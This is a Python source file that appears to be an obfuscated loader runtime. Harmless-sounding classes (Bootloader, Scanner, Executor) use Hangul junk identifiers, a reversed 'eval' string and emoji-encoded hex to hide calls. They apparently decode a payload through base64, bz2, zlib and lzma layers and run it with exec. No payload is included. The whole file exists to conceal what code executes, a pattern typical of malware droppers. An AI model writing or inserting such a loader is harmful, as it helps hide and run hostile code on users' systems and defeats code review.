class Bootloader(object):
	def __init__(self):
		pass

	def __call__(self, *낉됺쯻뵊솷떩훏놢뵪쁢쒩, **쫿꺂쐖뒱퇚요녷쪗팤뼂씻):
		global decryptor, str_pool, char_pool, mapping, core_decode, get_sys, run_code, num_cast
		globals()['decryptor'] = eval('lave'[::-1])
		globals()['str_pool'] = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
		globals()['char_pool'] = "🐉🐲⭐✦✧✨💫🌠⚡🔥💥☄️🌪❄️🌀🥋🥊⚔️👊🙌👐🟠🔴🟡🟢🔵🟣⚫⚪👽🤖👺🐢🐒🦍👑💎🔮🍑🍗🍚🍶🏯⛩⛰🛡👑🧙‍♂️🤜🤛😡😤🥵🤯🌌🌍🌑☀️🌠"
		globals()['mapping'] = dict(zip(str_pool, char_pool))
		콠늻될웏돘즣멹긥쫨퐌긴 = {뻀쟀쵛쀚뺽똵곡똤훤죘쭔: 뷹뚣큄뷥웙뿸핹붲짧츻칱 for 뷹뚣큄뷥웙뿸핹붲짧츻칱, 뻀쟀쵛쀚뺽똵곡똤훤죘쭔 in mapping.items()}
		globals()['core_decode'] = lambda 앴큜횼긑쳛츁뙦펨쭱쓔썓: getattr(bytes, "fromhex")("".join((콠늻될웏돘즣멹긥쫨퐌긴.get(뫻뮀찋옶슳뫍됨섈듈뷉땖, 뫻뮀찋옶슳뫍됨섈듈뷉땖) for 뫻뮀찋옶슳뫍됨섈듈뷉땖 in 앴큜횼긑쳛츁뙦펨쭱쓔썓))).decode()
		globals()['get_sys'] = decryptor(core_decode("😤⚪😤⚪🤯😡🤯🤜🥵⚪🤯♂🥵🟣🥵🌍😤⚪😤⚪")[::-1])
		globals()['run_code'] = decryptor(core_decode("🥵🤛🥵😤🤯🌌🥵😤")[::-1])
		globals()['num_cast'] = decryptor(core_decode("🤯😡🥵⚫🥵🌍")[::-1])

Bootloader()()

class Scanner(object):
	def __init__(self, *낉됺쯻뵊솷떩훏놢뵪쁢쒩):
		setattr(self, "b64", core_decode("🥵🤜🥵️🤯🤛🥵😤🤛🥵🤛😡"))
		setattr(self, "bz", core_decode("🥵🤜🤯🟡🤛🤜"))
		setattr(self, "zl", core_decode("🤯🟡🥵🔵🥵🌍🥵🤜"))
		setattr(self, "lz", core_decode("🥵🔵🤯🟡🥵🟣🥵️"))
		setattr(self, "입셒춡꾱고뱢쁄턍쉬퓻꼞", 낉됺쯻뵊솷떩훏놢뵪쁢쒩[0])

	def run_scan(self):
		return getattr(get_sys(getattr(self, "lz")), core_decode("🥵😡🥵😤🥵🤛🥵⚪🥵🟣🤯♂🤯🤜🥵😤🤯🤛🤯🤛"))(
			getattr(get_sys(getattr(self, "zl")), core_decode("🥵😡🥵😤🥵🤛🥵⚪🥵🟣🤯♂🤯🤜🥵😤🤯🤛🤯🤛"))(
				getattr(get_sys(getattr(self, "bz")), core_decode("🥵😡🥵😤🥵🤛🥵⚪🥵🟣🤯♂🤯🤜🥵😤🤯🤛🤯🤛"))(
					getattr(get_sys(getattr(self, "b64")), core_decode("🥵️🤛🌌🤛😤🥵😡🥵😤🥵🤛🥵⚪🥵😡🥵😤"))(getattr(self, "입셒춡꾱고뱢쁄턍쉬퓻꼞"))
				)
			)
		)

class Executor(object):
	def __init__(self):
		setattr(self, "msh", core_decode("🥵🟣🥵️🤯🤜🤯🤛🥵🌌🥵️🥵🔵"))

	def execute(self, 입셒춡꾱고뱢쁄턍쉬퓻꼞):
		run_code(
			getattr(get_sys(getattr(self, "msh")), core_decode("🥵🔵🥵⚪🥵️🥵😡🤯🤛"))(입셒춡꾱고뱢쁄턍쉬퓻꼞),
			globals()
		)

	def __call__(self, *낉됺쯻뵊솷떩훏놢뵪쁢쒩, **쫿꺂쐖뒱퇚요녷쪗팤뼂씻):
		payload = Scanner(낉됺쯻뵊솷떩훏놢뵪쁢쒩[0]).run_scan()
		self.execute(payload)

